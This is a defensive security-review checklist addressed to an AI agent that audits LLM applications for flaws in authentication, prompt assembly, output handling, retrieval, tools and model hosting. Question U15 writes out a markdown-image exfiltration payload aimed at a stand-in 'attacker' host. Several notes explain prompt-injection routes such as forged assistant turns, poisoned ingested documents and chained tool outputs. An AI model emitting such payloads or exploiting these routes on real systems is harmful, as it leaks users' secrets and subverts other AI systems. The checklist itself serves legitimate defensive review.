# AI Application Security Architecture Review

Agent instructions. Execute the phases in order and produce the report defined in Part 6. Human-facing context, the rationale behind Part 5, and the sign-off procedure are in `README.md`.

---

## Part 0: Operating Rules

### Role

You are performing a security architecture review of an AI-powered application. You have read access to the application's source repository, its infrastructure-as-code, and its product/design documentation. Your job is to determine, **from evidence**, how the system is built and where its security boundaries actually sit.

You are not scanning for vulnerabilities. You are establishing architectural facts and judging whether the design holds up when the model behaves adversarially.

### The single most important rule

**A control you cannot cite does not exist in your report.**

Language models reviewing code reliably fail in one direction: they find something adjacent-looking, pattern-match it to the control being asked about, and report it as present. A false `PASS` is worse than no review at all, because it closes a finding nobody will reopen. You are explicitly permitted, and expected, to return `UNDETERMINED` frequently. Forty cited answers and twenty honest "could not determine" is a good review. Sixty confident answers with no citations is a worthless one.

### Evidence protocol

1. **Every `PASS` requires a citation** in the form `path/to/file.py:120-134`, plus the relevant code quoted verbatim. Paraphrase is not evidence.
2. **Quote, do not summarize.** If the quoted code does not visibly do what you claim, the claim fails.
3. **Never infer a control from a framework default.** If the codebase uses a library that *can* enforce something, that is not evidence it *does*. Find the call site and the parameter.
4. **Never infer a control from naming.** A function called `sanitize_input` is evidence of an intent, not of a behavior. Read the body.
5. **Never infer a control from documentation alone.** If a design doc claims a control exists, record it as `DOCS_ONLY` and look for it in code. Documentation describing an unimplemented control is itself a finding.
6. **Absence of evidence is not evidence of absence.** If you searched and found nothing, report `UNDETERMINED` and list the search terms and paths you covered. Do not upgrade this to `FAIL`, and never to `PASS`.
7. **Separate code truth from runtime truth.** If behavior depends on a config value, environment variable, or feature flag, report the default found in the repo and flag the runtime dependency. A correct tenant filter disabled by an env var in production looks perfect in the repo.
8. **Report contradictions.** If two code paths disagree, or if docs contradict code, that contradiction is the finding.
9. **Show your search on a Critical `PASS`.** A citation proves you found one implementation. It does not prove you found every path that should have had one, and a `PASS` built on a shallow search is indistinguishable from a thorough one in the output. So for any question carrying Critical severity that you answer `PASS`, also report what you searched: the paths and patterns covered, the number of candidate call sites examined, and the basis on which you concluded the cited implementation is the only one. If you cannot make that statement, the answer is `PARTIAL`, not `PASS`.

### Answer statuses

| Status | Meaning |
|---|---|
| `PASS` | Control found, cited, and verified to do what the question asks. |
| `FAIL` | The question's failure condition is present and cited. |
| `PARTIAL` | Control exists on some paths but not all. Cite both the covered and uncovered paths. |
| `UNDETERMINED` | Could not establish from available evidence. List what you searched. |
| `DOCS_ONLY` | Claimed in documentation, not located in code. |
| `RUNTIME_DEPENDENT` | Behavior is config-driven. Report the repo default and what must be verified against the live deployment. |
| `N/A` | Question does not apply given the architecture discovered in Part 1. State why. |

### Review procedure

Work in order. Do not skip to the questions.

1. **Phase 1: Discovery (Part 1).** Build the component inventory and trust boundary map from the repo. This phase determines which question branches apply. Do not ask the humans what the architecture is; derive it, then confirm.
2. **Phase 2: Universal questions (Part 2).** Applies to every AI application regardless of design.
3. **Phase 3: Branch questions (Part 3).** Answer only the branches Phase 1 selected. Mark the rest `N/A` with a one-line justification.
4. **Phase 4: Blast radius (Part 4).** Mechanical exercise. Requires the tool inventory from Phase 1 and the output-handling findings from Phase 2.
5. **Phase 5: Report (Part 6).** Assemble the discovery output, findings, answer register, and verification queue into the report structure defined there. Do not summarise your way around a section: every part of that structure must be present, including the ones that are empty, marked as such.

### Search strategy

Do not grep blindly across the whole repo, it produces noise and false confidence. Instead:

- **Start at the entry points.** Find the HTTP handlers, queue consumers, or scheduled jobs that begin an AI request, and trace the request path forward: authentication, input handling, retrieval, prompt assembly, model call, output handling, response.
- **Follow the data, not the filenames.** The question is where untrusted content enters the prompt and where model output leaves the boundary. Those two paths answer most of this document.
- **Read the dependency manifest first.** `requirements.txt`, `pyproject.toml`, `package.json`, `go.mod`, `pom.xml`. It tells you the architecture faster than any file.
- **Check the IaC separately.** Terraform, CloudFormation, Helm charts, Kubernetes manifests, and CI/CD config carry the network exposure, secrets, and isolation answers that application code does not.
- **When you find one call site, look for the others.** Scattered model invocations are common and are themselves an architectural finding. Confirm whether a call is representative or exceptional.

### Output requirement

For every question, emit:

```
ID | STATUS | EVIDENCE (file:line + quoted code) | NOTES | SEVERITY (if FAIL/PARTIAL) | SEARCH COVERAGE (if Critical PASS)
```

Do not editorialize in the status field. Record what you found. Judgment belongs in the notes and the final report.

---

## Part 1: Architecture Discovery

Build this inventory first. Its output selects the branches in Part 3 and feeds the blast radius exercise in Part 4. Every item should be answered from the repo, not from anyone's description of the system.

### D1. Model providers and versions

*Look for:* dependency manifest entries (`openai`, `anthropic`, `google-genai`, `boto3` + Bedrock runtime calls, `transformers`, `vllm`, `ollama`, `litellm`); client instantiation; model identifier strings; environment variables naming endpoints or deployments.
*Record:* every model invoked, its provider, exact version/deployment identifier, and whether the version is pinned or floating.

### D2. Inference topology

*Look for:* client type in D1, plus IaC. Distinguish hosted third-party API, managed platform (Bedrock / Vertex / Azure AI Foundry), and self-hosted inference (vLLM, TGI, Triton, Ollama, llama.cpp).
*Record:* topology per model. A system often has more than one, note the mix.

### D3. Orchestration and agent framework

*Look for:* `langchain`, `llama-index`, `semantic-kernel`, `haystack`, `autogen`, `crewai`, `langgraph`, `pydantic-ai`, or hand-rolled loops. Identify whether there is an agent loop (model output determines the next action) or a fixed pipeline.
*Record:* framework, and critically, **whether control flow is model-determined or developer-determined.** This is the single biggest risk discriminator in the inventory.

### D4. Retrieval stack

*Look for:* vector store clients (`pinecone`, `weaviate`, `qdrant`, `chromadb`, `pgvector`, `milvus`, `opensearch`, `faiss`); embedding model calls; chunking configuration; ingestion entry points (file upload handlers, connector syncs, crawlers, webhook receivers).
*Record:* store, embedding model and where it runs, chunk strategy, and **every path by which content enters the index**.

### D5. Tool and function surface

*Look for:* function/tool schemas registered with the model, `@tool` decorators, function-calling JSON schemas, MCP server registrations, plugin manifests.
*Record, per tool:* name, what it actually calls, the credential it uses, whether it reads or writes, and whether the action is reversible. **This table is the input to Part 4 and is the most important artifact of the discovery phase.**

### D6. Prompt inventory and assembly

*Look for:* system prompt definitions (string literals, template files, prompt registries), the code that concatenates user input, retrieved content, history, and tool results into a final payload.
*Record:* where system instructions live, and the exact assembly mechanism, structured message roles versus string concatenation.

### D7. Guardrail and filtering components

*Look for:* moderation API calls, classifier invocations (`prompt-guard`, `llama-guard`, Azure Content Safety, Bedrock Guardrails), regex/blocklist filters, output validators, schema enforcement.
*Record:* each component and **its exact position in the request flow** (pre-model, post-model, pre-tool-execution, pre-render). A guardrail's position determines what it can actually protect.

### D8. Data stores and classification

*Look for:* database clients, object storage, cache layers, log sinks. Cross-reference with any data classification documentation.
*Record:* what data the AI path can reach, and its classification.

### D9. Identity, authentication, and authorization

*Look for:* auth middleware, session handling, token validation, RBAC/ABAC checks, tenant resolution logic.
*Record:* how user identity is established, and **whether that identity is carried through the AI pipeline as a first-class object** or dropped after the entry point.

### D10. External integrations and egress

*Look for:* MCP server configuration, outbound HTTP clients, webhook senders, third-party SDK usage reachable from the AI path.
*Record:* everything the AI path can reach outside the application boundary.

### D11. Runtime and deployment configuration

*Look for:* Terraform/CloudFormation/Helm/K8s manifests, Dockerfiles, CI/CD pipelines, secret management configuration, network policies, egress rules.
*Record:* network exposure of inference and vector endpoints, secrets handling, isolation boundaries.

### D12. Tenancy model

*Look for:* tenant identifier propagation, per-tenant resource naming, namespace/collection usage, row-level security policies.
*Record:* single-tenant, pooled with logical isolation, or siloed, and the enforcement mechanism for each shared resource.

### Discovery output

Produce three artifacts before proceeding:

1. **Component map**: the inventory above.
2. **Trust boundary list**: every point where data or control crosses between differently-trusted zones. At minimum: client→application, application→model, model→tools, external content→prompt, application→user.
3. **Branch selection**: which of the Part 3 branches apply, with the evidence that selected each.

| Branch | Selected when Part 1 shows |
|---|---|
| **R**: Retrieval / RAG | D4 shows any retrieval feeding the prompt |
| **T**: Agentic / tool-use | D5 is non-empty, or D3 shows model-determined control flow |
| **E**: External model API | D2 shows any third-party hosted inference |
| **H**: Self-hosted / managed model | D2 shows self-hosted or managed-platform inference |
| **F**: Fine-tuned / adapted model | Training, fine-tuning, or adapter-loading code present |
| **M**: MCP / external integrations | D10 shows MCP servers or model-reachable external services |

---

## Part 2: Universal Architecture Questions

Applies to every AI application regardless of what Part 1 discovered. Organized by trust boundary, because the recurring question at each one is the same: **is this control enforced in the pipeline, or merely requested in a prompt?** Instructions to a model are suggestions. Only code enforces.

### 2.1 Boundary: Client to Application

**U1. Is every entry point into the AI pipeline authenticated, including internal, debug, evaluation, and admin routes?**
- *Look for:* route definitions and their middleware. Enumerate all handlers reaching model invocation, then check each for auth. Pay attention to eval harnesses, prompt-playground routes, health endpoints that accept a prompt, and anything under a `/internal` or `/debug` prefix.
- *Pass:* every model-reaching route carries authentication middleware; no unauthenticated bypass path exists.
- *Fail:* any model-reaching route is unauthenticated, or auth is applied per-route by convention rather than by default-deny.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM06, LLM02

**U2. Is the authenticated user's identity carried through the pipeline as a first-class value, or dropped after the entry point?**
- *Look for:* whether the user/tenant principal is passed into retrieval calls, tool handlers, and logging, or whether downstream functions take only the prompt text.
- *Pass:* identity object propagated explicitly to every component that makes an authorization decision.
- *Fail:* identity available only at the HTTP layer; downstream components operate anonymously or with a service identity.
- *Source:* code · *Severity:* High · *OWASP:* LLM06
- *Note:* this is the precondition for most authorization controls later in this document. If it fails here, several downstream questions cannot pass.

**U3. Are per-user request rate, token, and cost limits enforced server-side?**
- *Look for:* rate-limiting middleware, token accounting, spend caps, queue depth limits, max input length checks.
- *Pass:* limits enforced server-side and bound to the authenticated principal.
- *Fail:* no limits, limits only in client code, or limits applied per-IP only.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM06

**U4. Is input size bounded before it reaches prompt assembly?**
- *Look for:* length/size validation on user input, uploaded file size and type limits, pagination caps on any content the user can cause to be loaded into context.
- *Pass:* explicit bounds enforced before assembly.
- *Fail:* unbounded input, or bounds enforced only by the model provider's own error.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM06

### 2.2 Boundary: Prompt Assembly

**U5. Are system instructions, user input, retrieved content, and tool results distinguishable in the assembled prompt?**
- *Look for:* the assembly code from D6. Check whether structured message roles are used, and whether untrusted content is wrapped in delimiters or tagged with provenance.
- *Pass:* untrusted content is structurally segregated, delivered in a user/tool role with explicit provenance markers, never concatenated into the system instruction.
- *Fail:* f-string or `+` concatenation of user or retrieved content directly into a single prompt blob, or untrusted content placed in the system role.
- *Source:* code · *Severity:* High · *OWASP:* LLM01
- *Note:* segregation does not prevent injection, the model may still obey embedded instructions. It bounds the damage and enables detection. Its absence guarantees the problem.

**U6. Can user-supplied input alter the structure of the prompt template itself, rather than only filling a slot?**
- *Look for:* template rendering where user input can contain template syntax; prompt construction that interpolates into control structures; any use of `eval`-style templating on user-influenced strings.
- *Pass:* user input is bound as a value, never rendered as template source.
- *Fail:* user content passed through the template engine, or template selection driven by user input.
- *Source:* code · *Severity:* High · *OWASP:* LLM01

**U7. Is conversation history reconstructed server-side, or accepted from the client?**
- *Look for:* request schema for the chat endpoint. Does it accept a `messages` array from the client, and is that array trusted as prior context?
- *Pass:* history is loaded server-side from a store keyed to the authenticated session; client supplies only the new turn.
- *Fail:* client-supplied message array is passed to the model, allowing an attacker to forge prior assistant turns, fabricate tool results, or replace the system prompt.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM01
- *Note:* a very common and very high-impact flaw. Forged assistant turns defeat most behavioral guardrails trivially.

**U8. Are secrets, internal identifiers, or credentials ever interpolated into prompts?**
- *Look for:* API keys, connection strings, internal user IDs, system architecture details, or credential material appearing in prompt templates or context injection.
- *Pass:* no secret material in any prompt; tools receive credentials out-of-band, never through the model.
- *Fail:* any credential, key, or sensitive internal identifier reachable in prompt text.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM02

**U9. Is the context window budget bounded and allocated deliberately?**
- *Look for:* token counting before assembly, truncation strategy, the order in which components are dropped when the budget is exceeded.
- *Pass:* explicit budget with a defined truncation policy that never silently drops safety-relevant instructions.
- *Fail:* no accounting, or truncation that can evict the system prompt while retaining attacker-supplied content.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM01, LLM06

### 2.3 Boundary: Application to Model

**U10. Are model calls centralized through a single gateway or client, or scattered across the codebase?**
- *Look for:* count distinct model invocation sites. Check whether they share a wrapper enforcing auth, logging, limits, and guardrails.
- *Pass:* a single chokepoint through which all inference flows, with cross-cutting controls applied there.
- *Fail:* multiple independent call sites with divergent handling; controls applied at some but not all.
- *Source:* code · *Severity:* High · *OWASP:* LLM06
- *Note:* scattered call sites are the architectural root cause of most "the guardrail was bypassed" incidents. The bypass is usually a second code path nobody remembered.

**U11. Are timeouts, retries, and failure behavior defined for every model call?**
- *Look for:* timeout parameters, retry policy, circuit breakers, and what the application does when inference fails.
- *Pass:* explicit timeouts and a defined, safe failure path.
- *Fail:* no timeout, unbounded retries (a cost amplification vector), or an undefined failure path.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM06

**U12. Is network egress from the inference path restricted?**
- *Look for:* egress rules in IaC, allowlists for outbound destinations, proxy configuration.
- *Pass:* egress restricted to known provider endpoints.
- *Fail:* unrestricted outbound access from components handling model traffic.
- *Source:* config · *Severity:* Medium · *OWASP:* LLM02

### 2.4 Boundary: Model Output to Downstream Consumers

> The highest-value section of this review. Every question here assumes model output is attacker-controllable, because via indirect injection it is.

**U13. Is model output treated as untrusted input by every consumer?**
- *Look for:* trace every path model output takes. Enumerate consumers: renderers, parsers, tool dispatchers, database writes, downstream API calls, file writes, message senders.
- *Pass:* validation applied at each consumer appropriate to its sink.
- *Fail:* any consumer treats output as trusted because it "came from our own model."
- *Source:* code · *Severity:* Critical · *OWASP:* LLM10

**U14. Does model output reach any execution sink: shell, `eval`, SQL, file path, deserialization, or dynamic import?**
- *Look for:* `subprocess`, `os.system`, `eval`, `exec`, raw SQL construction, path joins, `pickle.loads`, dynamic imports, anywhere downstream of a model call.
- *Pass:* no execution sink, or sink is reached only through a strictly validated allowlist of parameterized operations.
- *Fail:* model output reaches any interpreter, shell, query, or filesystem path without validation.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM10
- *Note:* your SAST likely did not flag this. Taint engines model request parameters as untrusted sources; they do not model LLM responses as untrusted. Verify manually.

**U15. Is model output rendered as markdown or HTML, and if so, is it sanitized?**
- *Look for:* frontend rendering of responses, `dangerouslySetInnerHTML`, markdown renderers, whether image and link URLs in output are permitted to be arbitrary.
- *Pass:* rendered through a sanitizing pipeline; external image loading and arbitrary link targets disabled or allowlisted.
- *Fail:* raw HTML rendering, or markdown rendering that auto-loads images from model-specified URLs.
- *Source:* code · *Severity:* High · *OWASP:* LLM10, LLM02
- *Note:* the auto-loading image is a live data-exfiltration channel. An injected instruction emits `![](https://attacker/?d=<secret>)`, the browser fetches it, and the secret leaves in the query string with no user interaction.

**U16. Are structured outputs schema-validated before use?**
- *Look for:* JSON parsing of model output, schema enforcement (Pydantic, JSON Schema, function-calling validation), and the handling of parse failures.
- *Pass:* strict schema validation with a safe failure path; unexpected fields rejected.
- *Fail:* `json.loads` into direct use, or validation that logs and continues.
- *Source:* code · *Severity:* High · *OWASP:* LLM10

**U17. Are guardrails positioned where they can actually intercept, and do they fail closed?**
- *Look for:* from D7, the exact position of each filter in the flow, and the exception/error handling around it.
- *Pass:* guardrail sits between the model and the consumer it protects, and a guardrail service failure blocks the request.
- *Fail:* guardrail runs in parallel with delivery, runs only on a subset of paths, or is wrapped in a `try/except` that proceeds on error.
- *Source:* code · *Severity:* High · *OWASP:* LLM01, LLM10
- *Note:* fail-open guardrails are extremely common and invisible to testing, since the guardrail works fine right up until the dependency it calls has an outage.

### 2.5 Boundary: Application to User

**U18. Is the response checked for sensitive content before delivery?**
- *Look for:* output filtering for secrets, PII, other tenants' identifiers, internal system details; any redaction layer.
- *Pass:* an explicit egress check appropriate to the data classifications the AI path can reach.
- *Fail:* no check, or a check that only covers profanity/toxicity while the system handles regulated data.
- *Source:* code · *Severity:* High · *OWASP:* LLM02

**U19. Do error paths leak internals: stack traces, prompts, model identifiers, or retrieved content?**
- *Look for:* exception handlers on AI routes, error serialization, debug flags and their defaults.
- *Pass:* generic client-facing errors; detail retained server-side only.
- *Fail:* provider error payloads, prompt contents, or stack traces returned to the client.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM02

### 2.6 Cross-Cutting

**U20. What portion of prompts, responses, and retrieved content is written to logs, and who can read those logs?**
- *Look for:* logging statements on the AI path, log sink configuration, retention, and access control on the sink.
- *Pass:* sensitive content excluded or redacted; log sink access controlled to the same standard as the source data.
- *Fail:* full prompt/response logging into a general-purpose observability platform with broader access than the underlying data.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM02
- *Note:* logs are a second copy of the sensitive data, usually under weaker access control than the system that produced it.

**U21. Can a single request be reconstructed end-to-end for investigation?**
- *Look for:* correlation/trace IDs spanning retrieval, prompt assembly, model call, tool invocations, and response; retention of which sources were retrieved.
- *Pass:* a single identifier ties the full chain together, including tool calls and their arguments.
- *Fail:* no correlation, or tool invocations logged without arguments and results.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM06

**U22. Are secrets used by the AI path managed outside the codebase and scoped narrowly?**
- *Look for:* provider API keys, vector store credentials, tool credentials. Check for hardcoded values, `.env` files in version control, and the scope of each credential.
- *Pass:* secrets from a managed store, distinct credentials per component, least-privilege scoping, rotation documented.
- *Fail:* hardcoded secrets, shared omnibus credentials, or keys with broader scope than the component requires.
- *Source:* code, config · *Severity:* Critical · *OWASP:* LLM06

**U23. Does the system degrade safely when a dependency fails?**
- *Look for:* behavior when the model provider, vector store, guardrail service, or auth service is unavailable. Check fallbacks specifically for security-relevant downgrades.
- *Pass:* failures degrade to reduced functionality, never to reduced enforcement.
- *Fail:* any fallback that bypasses a control, or a secondary provider without equivalent data protections.
- *Source:* code · *Severity:* High · *OWASP:* LLM06

**U24. Is there a kill switch, and can the AI feature be disabled without a deploy?**
- *Look for:* feature flags gating AI functionality, per-tenant disablement, and whether the flag check is server-side.
- *Pass:* server-side flag able to disable the feature globally and per-tenant.
- *Fail:* no flag, or disablement requires a full release cycle.
- *Source:* code, config · *Severity:* Medium · *OWASP:* LLM06

**U25. Are there automated adversarial tests in CI?**
- *Look for:* test suites containing prompt injection payloads, jailbreak regression cases, authorization bypass tests on the retrieval path, output handling tests with hostile model responses.
- *Pass:* adversarial cases run in CI and block merge on regression.
- *Fail:* only happy-path tests, or adversarial testing performed once manually and never automated.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM01
- *Note:* model and prompt changes silently alter safety behavior. Without regression tests, every prompt edit is an untested security change.

---

## Part 3: Branch Questions

Answer only the branches selected by Part 1. Mark the others `N/A` with the discovery evidence that ruled them out.

### Branch R: Retrieval / RAG

**R1. Is authorization applied to the retrieval query itself, or to the results after retrieval?**
- *Look for:* the retriever call site. Check whether a user- or tenant-derived filter is passed as a query parameter (`filter=`, `where=`, namespace selection, RLS predicate) or whether the code retrieves broadly and then filters returned documents in application code.
- *Pass:* an identity-derived filter is bound into the query, with the filter value taken from the authenticated session, not from client-supplied request fields.
- *Fail:* post-retrieval filtering in application code, filter value sourced from the request body, or no filter.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM09, LLM02
- *Note:* post-retrieval filtering is code a scanner considers correct, it does filter, just too late. Unauthorized content has already been read from the store, and any code path that forgets the post-filter step leaks. Enforcement must be in the query.

**R2. Is the top-k retrieval budget bounded, and is it sized deliberately?**
- *Look for:* `k`, `top_k`, `limit` values and whether they are configurable by the client.
- *Pass:* server-controlled bound, sized to the context budget.
- *Fail:* client-controllable `k`, or a value large enough that broad swaths of the index enter context on any query.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM09
- *Note:* every additional retrieved chunk is additional exposure if any authorization control is imperfect. Over-retrieval amplifies every other failure in this branch.

**R3. Is every ingestion path into the index authenticated and authorized?**
- *Look for:* from D4, enumerate all ingestion entry points: upload handlers, connector syncs, crawlers, webhook receivers, scheduled jobs, admin tooling. Check auth on each.
- *Pass:* every write path to the index requires authorization, and the writing principal is recorded.
- *Fail:* any unauthenticated or implicitly trusted ingestion path.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM05, LLM09
- *Note:* ingestion is the indirect injection entry point. An attacker who can place one document into the index influences every query that retrieves it, without touching the application.

**R4. Is content sanitized at ingestion for hidden or structurally deceptive instructions?**
- *Look for:* preprocessing between document parsing and embedding. Check for handling of HTML comments, zero-width and bidirectional Unicode, white-on-white text in parsed documents, hidden spreadsheet cells, and text that mimics system-prompt framing.
- *Pass:* an explicit sanitization step with defined rules, applied to all ingestion paths.
- *Fail:* raw parsed content embedded directly.
- *Source:* code · *Severity:* High · *OWASP:* LLM01, LLM05

**R5. Is retrieved content marked as data when placed in the prompt?**
- *Look for:* prompt assembly in D6 specific to the retrieval path. Check for delimiters, provenance tags, or role separation around retrieved chunks.
- *Pass:* retrieved content clearly delimited and labeled as untrusted reference material.
- *Fail:* chunks concatenated into the prompt indistinguishably from instructions.
- *Source:* code · *Severity:* High · *OWASP:* LLM01

**R6. Do source-permission changes propagate to the index?**
- *Look for:* the sync mechanism between source systems and the index. Check whether deletion, movement, and ACL changes at the source trigger removal or re-permissioning of the corresponding vectors.
- *Pass:* an automated sync path handling deletes and permission revocations, with a bounded lag documented.
- *Fail:* one-way ingestion with no deletion or ACL propagation.
- *Source:* code · *Severity:* High · *OWASP:* LLM02, LLM09
- *Note:* without this, a document restricted at the source stays retrievable through the AI indefinitely. No attacker is required, and the exposure is invisible to the source system's own access logs.

**R7. Is there a path to force immediate removal of specific content, including cached embeddings and derived caches?**
- *Look for:* deletion APIs, cache invalidation on delete, any response cache or summary store holding derived content.
- *Pass:* a deletion path that purges vectors and all derived caches, invocable without a deploy.
- *Fail:* no forced-removal path, or deletion that leaves derived caches populated.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM09

**R8. How is tenant isolation enforced in the vector store specifically?**
- *Look for:* namespace/collection-per-tenant, metadata filtering, or separate indexes. If metadata filtering, check how the tenant value is derived and whether it is ever string-interpolated.
- *Pass:* physical or namespace separation, or metadata filtering where the tenant value comes from the verified session and is passed as a bound parameter.
- *Fail:* tenant scoping by string interpolation, tenant value from client input, or shared index with no scoping.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM09, LLM02

**R9. If embeddings are generated by an external service, what content leaves the boundary?**
- *Look for:* the embedding client from D4. If hosted externally, determine what text is sent, at both ingestion and query time.
- *Pass:* content classification permits external processing, and the provider's retention settings are explicitly configured.
- *Fail:* regulated or confidential content embedded through an external API with default retention.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM02
- *Note:* teams frequently secure the LLM provider relationship and forget that the embedding provider sees the same corpus, at ingestion time, in full.

**R10. Are citations verifiable, or can the model fabricate source attribution?**
- *Look for:* whether citations returned to the user are constructed from the actual retrieved document metadata or parsed out of the model's generated text.
- *Pass:* citations built programmatically from retrieval results.
- *Fail:* citations extracted from model output, allowing fabricated or mismatched attribution.
- *Source:* code · *Severity:* Medium · *OWASP:* LLM07

### Branch T: Agentic / Tool-Use

**T1. For each tool, what credential does it use, and is that credential scoped to the invoking user's authority?**
- *Look for:* the D5 tool table. For each handler, trace the credential: does it use a standing service account, or does it act under the end user's delegated authority?
- *Pass:* tool actions execute under the invoking user's identity, or under a credential scoped no more broadly than that user's own permissions.
- *Fail:* tools hold standing service credentials with authority exceeding any individual user.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM06
- *Note:* the confused deputy problem, and the most consequential design flaw in agentic systems. The code is correct, the credential is wrong. Nothing in SAST, DAST, or a conventional pentest identifies this.

**T2. Is the end user's authorization re-checked at the tool layer, or only at the application entry point?**
- *Look for:* authorization checks inside tool handlers, not just on the route that started the conversation.
- *Pass:* each tool independently verifies that the invoking principal may perform this specific action on this specific resource.
- *Fail:* tool handlers assume authorization was established upstream.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM06

**T3. Are tool arguments validated before execution, given that the model supplies them?**
- *Look for:* validation in the handler between receiving model-generated arguments and acting on them. Check for identifier validation, path handling, allowlists on any target parameter.
- *Pass:* strict schema and semantic validation; resource identifiers checked for ownership before use.
- *Fail:* model-supplied arguments passed directly into the underlying operation.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM10, LLM06
- *Note:* a correct tool with an unvalidated resource ID is an IDOR reachable by prompt injection.

**T4. Do consequential or irreversible actions require human approval, and is the gate enforced server-side?**
- *Look for:* confirmation flows for writes, sends, deletions, payments, permission changes. Critically, determine whether approval is verified on the server before execution, or whether the UI merely asks and the API executes on request.
- *Pass:* server-side approval token or state machine that the agent cannot satisfy on its own.
- *Fail:* no gate on consequential actions, or a UI-only confirmation the API does not enforce.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM06

**T5. Is tool output treated as untrusted input to the next reasoning step?**
- *Look for:* how tool results re-enter the prompt. A tool that fetches a URL, reads a file, or queries a third party returns attacker-influenceable content.
- *Pass:* tool results delimited and labeled as untrusted, with the same treatment as retrieved content.
- *Fail:* tool output concatenated into context as trusted.
- *Source:* code · *Severity:* High · *OWASP:* LLM01
- *Note:* this is the pivot that turns a single injection into a multi-step compromise, each tool result carrying the next instruction.

**T6. Are agent loops bounded in steps, wall-clock time, and spend?**
- *Look for:* iteration caps, recursion limits, timeouts, token budget per task, cost ceilings.
- *Pass:* hard caps on all three, enforced in the loop.
- *Fail:* unbounded loop with only a model-side stopping heuristic.
- *Source:* code · *Severity:* High · *OWASP:* LLM06

**T7. If the agent can execute code, is execution sandboxed and isolated?**
- *Look for:* code interpreter tools, container or microVM isolation, network policy inside the sandbox, filesystem scope, resource limits, and whether the sandbox holds any credentials.
- *Pass:* isolated runtime, no network egress or strictly allowlisted, no credentials present, ephemeral filesystem.
- *Fail:* execution in the application process, on a shared host, or in an environment holding credentials or network reach.
- *Source:* code, config · *Severity:* Critical · *OWASP:* LLM10

**T8. Is every tool invocation logged with arguments, result, and the invoking principal?**
- *Look for:* logging inside the dispatcher, not only the final response.
- *Pass:* a complete, correlated action record sufficient to reconstruct what the agent did and on whose behalf.
- *Fail:* only the final answer logged, or arguments omitted.
- *Source:* code · *Severity:* High · *OWASP:* LLM06

**T9. Can the set of available tools change at runtime, and who controls that?**
- *Look for:* dynamic tool registration, plugin loading, tool definitions fetched from a remote source or database.
- *Pass:* tool set fixed at deploy, or changes gated behind privileged, audited configuration.
- *Fail:* tools registrable at runtime from a source the model or an ordinary user can influence.
- *Source:* code · *Severity:* High · *OWASP:* LLM04, LLM06

### Branch E: External Model API

**E1. Are the provider's data-retention and training-use controls explicitly configured in code or config?**
- *Look for:* zero-retention headers, enterprise endpoint selection, project/org settings committed as config, opt-out parameters on the client.
- *Pass:* explicit configuration present and verifiable, not merely assumed from the contract.
- *Fail:* default endpoints and default retention, with data protection assumed to be handled by the agreement alone.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM02

**E2. Is sensitive content redacted before leaving the boundary?**
- *Look for:* PII detection, secret scanning, or redaction applied to the payload before the provider call.
- *Pass:* redaction appropriate to the data classifications reachable on this path, applied at the gateway.
- *Fail:* no pre-send filtering where regulated or secret material can reach the prompt.
- *Source:* code · *Severity:* High · *OWASP:* LLM02

**E3. Are model versions pinned, and is an unannounced provider-side change detectable?**
- *Look for:* model identifier strings (pinned snapshot versus floating alias), and any behavioral baseline or canary evaluation run on a schedule.
- *Pass:* pinned versions plus a scheduled evaluation that detects behavioral drift.
- *Fail:* floating alias with no drift detection, so a provider-side update silently changes safety behavior in production.
- *Source:* code, config · *Severity:* Medium · *OWASP:* LLM04

**E4. Do provider credentials have blast radius beyond this application?**
- *Look for:* key scope, whether the key is shared with other applications or environments, spend limits on the key, rotation mechanism.
- *Pass:* dedicated, scoped, rotatable key with a spend cap.
- *Fail:* an organization-wide key reused across environments.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM06

**E5. Does provider failover preserve the security posture?**
- *Look for:* fallback provider configuration and whether the alternate has equivalent contractual and technical data protections.
- *Pass:* all configured providers meet the same bar, or failover is disabled for sensitive paths.
- *Fail:* failover to a provider without a data protection agreement or without retention controls configured.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM02, LLM04

### Branch H: Self-Hosted or Managed-Platform Model

**H1. Is the inference endpoint reachable only from within the trust boundary?**
- *Look for:* service definitions, ingress rules, security groups, listener bind addresses, and whether the inference server is exposed beyond the application tier.
- *Pass:* private networking only, with authentication in front of inference.
- *Fail:* inference endpoint bound to a public interface, or reachable without authentication from a broader network zone.
- *Source:* config · *Severity:* Critical · *OWASP:* LLM06
- *Note:* self-hosted inference servers commonly ship with no authentication by default, on the assumption of a private network. Verify the assumption holds in the actual deployment.

**H2. Is model artifact integrity verified before load?**
- *Look for:* checksum or signature verification in the deploy pipeline or model loading code; the provenance of the artifact being loaded.
- *Pass:* hash or signature checked against a trusted published value before the artifact is loaded.
- *Fail:* artifacts pulled and loaded without verification.
- *Source:* code, config · *Severity:* High · *OWASP:* LLM04

**H3. What serialization format are model artifacts in, and does loading execute code?**
- *Look for:* file extensions and loader calls. Distinguish pickle-based formats (`.pkl`, `.bin`, `.pth`, `torch.load` without `weights_only=True`) from safe-by-design formats (`.safetensors`, GGUF).
- *Pass:* safe formats, or `weights_only=True` enforced, with artifacts scanned before load.
- *Fail:* pickle-based artifacts loaded without restriction from any source not fully controlled.
- *Source:* code · *Severity:* Critical · *OWASP:* LLM04

**H4. Are model weights and adapters access-controlled as sensitive assets?**
- *Look for:* storage location, bucket/volume policies, encryption at rest, and who can read or replace artifacts.
- *Pass:* least-privilege access, encrypted, with write access restricted to the build pipeline and reads audited.
- *Fail:* artifacts in broadly readable storage, or writable by application runtime identities.
